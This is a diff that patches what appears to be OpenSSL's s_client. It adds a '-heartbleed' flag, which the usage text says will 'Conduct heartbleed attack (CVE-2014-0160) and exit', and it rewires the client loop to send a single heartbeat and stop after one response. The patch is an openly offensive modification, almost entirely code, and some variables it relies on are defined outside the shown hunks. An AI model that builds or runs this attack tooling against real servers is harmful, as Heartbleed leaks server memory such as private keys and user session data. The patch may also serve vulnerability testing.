@@ -163,6 +163,7 @@ typedef unsigned int u_int;
 #include <openssl/rand.h>
 #include <openssl/ocsp.h>
 #include <openssl/bn.h>
+#include <openssl/tls1.h>
 #ifndef OPENSSL_NO_SRP
 #include <openssl/srp.h>
 #endif
@@ -367,6 +368,7 @@ static void sc_usage(void)
 #endif
  	BIO_printf(bio_err," -keymatexport label   - Export keying material using label\n");
  	BIO_printf(bio_err," -keymatexportlen len  - Export len bytes of keying material (default 20)\n");
+	BIO_printf(bio_err," -heartbleed           - Conduct heartbleed attack (CVE-2014-0160) and exit\n");
 	}
 
 #ifndef OPENSSL_NO_TLSEXT
@@ -966,6 +968,10 @@ int MAIN(int argc, char **argv)
 			if (--argc < 1) goto bad;
 			keymatexportlen=atoi(*(++argv));
 			if (keymatexportlen == 0) goto bad;
+			}
+		else if (strcmp(*argv,"-heartbleed") == 0)
+		        {
+			heartbleed_activated = 1;
 			}
                 else
 			{
@@ -1642,6 +1648,20 @@ SSL_set_tlsext_status_ids(con, ids);
 			}
 			(void)fcntl(fileno(stdin), F_SETFL, 0);
 #else
+			if (heartbleed_activated) {
+			  static int heartbleed_sent = 0;
+			  static int first_loop = 1;
+			  if (num_heartbeat_responses >= 1) {
+			    /* Attack has already been completed. */
+			    goto shut;
+			  }
+			  if (!heartbleed_sent && !first_loop) {
+			    SSL_heartbeat(con);
+			    heartbleed_sent = 1;
+			  }
+			  first_loop = 0;
+			}
+
 			i=select(width,(void *)&readfds,(void *)&writefds,
 				 NULL,timeoutp);
 #endif
@@ -1661,7 +1681,6 @@ SSL_set_tlsext_status_ids(con, ids);
 
 		if (!ssl_pending && FD_ISSET(SSL_get_fd(con),&writefds))
 			{
-			SSL_heartbeat(con);
 			k=SSL_write(con,&(cbuf[cbuf_off]),
 				(unsigned int)cbuf_len);
 			switch (SSL_get_error(con,k))
